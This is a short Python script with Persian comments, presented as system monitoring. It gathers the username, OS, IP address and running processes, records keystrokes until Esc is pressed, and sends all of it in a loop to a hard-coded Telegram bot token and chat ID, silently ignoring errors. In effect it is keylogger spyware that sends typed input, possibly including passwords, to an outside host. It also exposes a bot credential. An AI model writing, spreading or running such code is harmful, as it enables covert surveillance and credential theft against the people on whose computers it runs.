import requests
import platform
import getpass
import socket
import time
import psutil  # برای نظارت بر فرایندها
import keyboard  # برای ثبت ورودی‌های صفحه‌کلید

# توکن ربات و چت آیدی رو اینجا بذار
BOT_TOKEN = '7764160984:AAHjCQkSgPQCOOfSJmc0SoQO5aooXQUQr4o'
CHAT_ID = '7922841036'  # چت آیدی خودت

def get_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "IP پیدا نشد"

def get_info():
    info = f"""
    [ مانیتورینگ سیستم ]
    کاربر: {getpass.getuser()}
    سیستم عامل: {platform.system()} {platform.release()}
    IP: {get_ip()}
    """
    return info

def send_to_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': msg
    }
    try:
        requests.post(url, data=payload)
    except:
        pass  # خطا نگیریم

def monitor_system():
    while True:
        # دریافت اطلاعات سیستم
        system_info = get_info()
        send_to_telegram(system_info)

        # نظارت بر فرایندهای در حال اجرا
        processes = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
        process_info = "\n".join([f"PID: {p['pid']}, Name: {p['name']}, User: {p['username']}" for p in processes])
        send_to_telegram(f"فرایندهای سیستم:\n{process_info}")

        # نظارت بر ورودی‌های صفحه‌کلید
        # اینجا فقط چند ثانیه‌ای ورودی‌های صفحه‌کلید را ثبت می‌کنیم
        keys_pressed = keyboard.record(until='esc')  # ورودی‌ها تا زمانی که کلید "esc" زده نشود
        keys_info = "\n".join([key.name for key in keys_pressed if key.name is not None])
        send_to_telegram(f"ورودی‌های صفحه‌کلید:\n{keys_info}")

        # به مدت 10 ثانیه صبر می‌کنیم تا دوباره تکرار شود
        time.sleep(10)

# شروع نظارت بر سیستم
monitor_system()